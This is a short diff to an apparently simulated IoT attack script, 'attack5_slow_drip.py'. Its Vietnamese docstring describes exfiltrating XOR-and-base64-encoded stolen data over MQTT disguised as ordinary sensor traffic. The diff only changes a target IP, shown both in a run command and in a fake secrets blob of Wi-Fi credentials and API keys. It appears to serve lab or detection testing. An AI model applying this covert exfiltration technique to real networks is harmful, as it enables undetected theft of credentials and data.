@@ -6,7 +6,7 @@ stolen data được mã hóa (XOR + base64). Đây là kịch bản khó
 phát hiện nhất vì trông giống traffic bình thường.
 
 Chạy:
-    python3 attack5_slow_drip.py --host 10.0.0.1 --topic home/sensor/temp --rate 0.2
+    python3 attack5_slow_drip.py --host 10.0.0.10 --topic home/sensor/temp --rate 0.2
 """
 
 import paho.mqtt.client as mqtt
@@ -35,7 +35,7 @@ SECRET_DATA = json.dumps({
     "wifi_ssid":   "CorpNetwork",
     "wifi_psk":    "Enterprise@Pass",
     "api_keys":    ["key_abc123", "key_def456", "key_ghi789"],
-    "internal_ips": ["192.168.1.1", "192.168.1.100", "10.0.0.1"],
+    "internal_ips": ["192.168.1.1", "192.168.1.100", "10.0.0.10"],
     "device_id":   "thermostat-bedroom-001",
 })
 
